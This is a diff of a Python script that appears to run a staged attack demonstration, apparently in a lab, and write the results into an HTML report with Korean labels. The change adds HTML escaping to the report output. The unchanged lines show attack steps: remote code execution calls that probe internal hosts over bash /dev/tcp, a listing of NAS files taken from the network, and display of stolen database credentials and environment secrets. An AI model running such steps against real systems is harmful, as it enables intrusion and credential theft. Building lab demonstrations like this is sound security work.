@@ -126,6 +126,10 @@ def main():
     results = {}
     details = {}
 
+    def _esc(t):
+        import html
+        return html.escape(str(t))
+
     # ══════════════════════════════════════════════════════════
     # Phase 1: 정찰 (Reconnaissance)
     # ══════════════════════════════════════════════════════════
@@ -148,7 +152,7 @@ def main():
         tc_check = execute_rce("bash -c 'echo >/dev/tcp/teamcity-server/8111 2>&1 && echo OPEN || echo CLOSED'")
 
         recon_detail = f"""
-<strong>내부 시스템 정보:</strong><pre>{recon_result[:200]}</pre>
+<strong>내부 시스템 정보:</strong><pre>{_esc(recon_result[:200])}</pre>
 <strong>내부망 서비스 탐색 결과:</strong>
 <ul>
   <li>Employee Desktop VNC (employee-desktop:6901): {f'<span style="color:#22c55e;">포트 OPEN</span>' if 'OPEN' in vnc_check or vnc_check.strip() == '' else '<span style="color:#ef4444;">닫힘</span>'}</li>
@@ -161,7 +165,7 @@ def main():
     else:
         warn("내부 시스템 정보 획득 실패.")
         results["phase1"] = False
-        details["phase1"] = "RCE를 통한 내부 환경 정찰에 실패했습니다."
+        details["phase1"] = f"RCE를 통한 내부 환경 정찰에 실패했습니다.<pre>{_esc(recon_result[:200])}</pre>"
 
     # ══════════════════════════════════════════════════════════
     # Phase 2: NAS 기밀 탈취 (Data Exfiltration)
@@ -177,7 +181,7 @@ def main():
         ok("NAS 파일시스템 접근 성공!")
         info(f"NAS 파일 목록:\n{nas_smb_list}")
         results["phase2"] = True
-        details["phase2"] = f"<strong>탈취된 NAS 파일 목록:</strong><pre>{nas_smb_list}</pre>"
+        details["phase2"] = f"<strong>탈취된 NAS 파일 목록:</strong><pre>{_esc(nas_smb_list)}</pre>"
     else:
         # NAS 컨테이너 연결 확인만으로도 위협 증명
         nas_ping = execute_rce("bash -c 'echo >/dev/tcp/nas/445 2>&1 && echo NAS_OPEN || echo NAS_CLOSED'")
@@ -240,26 +244,26 @@ def main():
         results["phase3"] = True
         details["phase3"] = f"""
 <strong>📄 application.properties 설정 파일 원문:</strong>
-<pre>{props_raw[:600]}</pre>
+<pre>{_esc(props_raw[:600])}</pre>
 
 <strong>🔑 탈취된 DB 접속 크리덴셜:</strong>
 <ul>
-  <li>DB URL : <span style="color:#ef4444;font-weight:bold">{db_creds.get('url', '미발견')}</span></li>
-  <li>USER   : <span style="color:#ef4444;font-weight:bold">{db_creds.get('user', '미발견')}</span></li>
-  <li>PASS   : <span style="color:#ef4444;font-weight:bold">{db_creds.get('pass', '미발견')}</span></li>
+  <li>DB URL : <span style="color:#ef4444;font-weight:bold">{_esc(db_creds.get('url', '미발견'))}</span></li>
+  <li>USER   : <span style="color:#ef4444;font-weight:bold">{_esc(db_creds.get('user', '미발견'))}</span></li>
+  <li>PASS   : <span style="color:#ef4444;font-weight:bold">{_esc(db_creds.get('pass', '미발견'))}</span></li>
 </ul>
 
 <strong>🖥️ 환경변수 중 민감 정보 (필터링):</strong>
-<pre>{env_filtered[:400] if env_filtered.strip() else "(환경변수에서 해당 항목 없음)"}</pre>
+<pre>{_esc(env_filtered[:400]) if env_filtered.strip() else "(환경변수에서 해당 항목 없음)"}</pre>
 
-<p>설정 파일 검색 경로: <code>{cred_search[:200]}</code></p>
+<p>설정 파일 검색 경로: <code>{_esc(cred_search[:200])}</code></p>
 """
     else:
         warn("환경변수에서 크리덴셜을 찾지 못했습니다.")
         results["phase3"] = False
         details["phase3"] = f"""환경변수 내에서 DB 접속 정보를 찾지 못했습니다.
-<pre>{env_raw[:300]}</pre>
-<p>설정 파일 검색 결과: <code>{cred_search}</code></p>"""
+<pre>{_esc(env_raw[:300])}</pre>
+<p>설정 파일 검색 결과: <code>{_esc(cred_search)}</code></p>"""
 
 
     # ══════════════════════════════════════════════════════════
